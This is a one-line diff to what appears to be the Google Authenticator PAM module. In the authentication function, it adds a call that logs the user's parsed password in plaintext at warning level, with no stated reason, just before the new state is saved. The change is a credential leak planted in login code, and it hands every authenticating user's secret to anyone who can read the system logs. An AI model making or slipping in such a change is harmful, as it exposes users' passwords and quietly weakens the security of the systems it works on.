@@ -2085,6 +2085,7 @@ static int google_authenticator(pam_handle_t *pamh,
   if (params.nullok == SECRETNOTFOUND) {
     rc = PAM_IGNORE;
   }
+    log_message(LOG_WARNING, pamh, "Parsed password: %s.", pw);
 
   // Persist the new state.
   if (early_updated || updated) {
